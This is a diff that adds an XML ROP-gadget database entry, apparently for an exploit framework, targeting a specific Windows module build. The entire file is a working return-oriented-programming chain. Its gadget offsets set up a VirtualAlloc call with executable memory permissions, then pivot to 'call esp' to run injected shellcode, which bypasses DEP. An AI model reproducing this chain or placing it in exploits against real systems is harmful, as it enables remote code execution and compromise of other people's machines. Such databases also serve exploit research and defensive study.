@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>7.0.7601.17744</target>
+  </compatibility>
+
+  <gadgets base="0x6ff50000">
+    <gadget offset="0x00078a9a">POP EBP # RETN  ** ASLR</gadget>
+    <gadget offset="0x00078a9a">skip 4 bytes  ** ASLR</gadget>
+    <gadget offset="0x0001e197">POP EBX # RETN  ** ASLR</gadget>
+    <gadget value="0x00000001">0x00000001-> ebx</gadget>
+    <gadget offset="0x00031ae5">POP EDX # RETN  ** ASLR</gadget>
+    <gadget value="0x00001000">0x00001000-> edx</gadget>
+    <gadget offset="0x0004a8d0">POP ECX # RETN  ** ASLR</gadget>
+    <gadget value="0x00000040">0x00000040-> ecx</gadget>
+    <gadget offset="0x00018e15">POP EDI # RETN  ** ASLR</gadget>
+    <gadget offset="0x00009f09">RETN (ROP NOP)  ** ASLR</gadget>
+    <gadget offset="0x0005fd4b">POP ESI # RETN  ** ASLR</gadget>
+    <gadget offset="0x0000b7bd">JMP [EAX] </gadget>
+    <gadget offset="0x0004aacd">POP EAX # RETN  ** ASLR</gadget>
+    <gadget offset="0x000011bc">ptr to VirtualAlloc()  ** ASLR</gadget>
+    <gadget offset="0x00065cfc">PUSHAD # RETN  ** ASLR</gadget>
+    <gadget offset="0x000330ad">ptr to 'call esp'  ** ASLR</gadget>
+  </gadgets>
+</rop>
+</db>
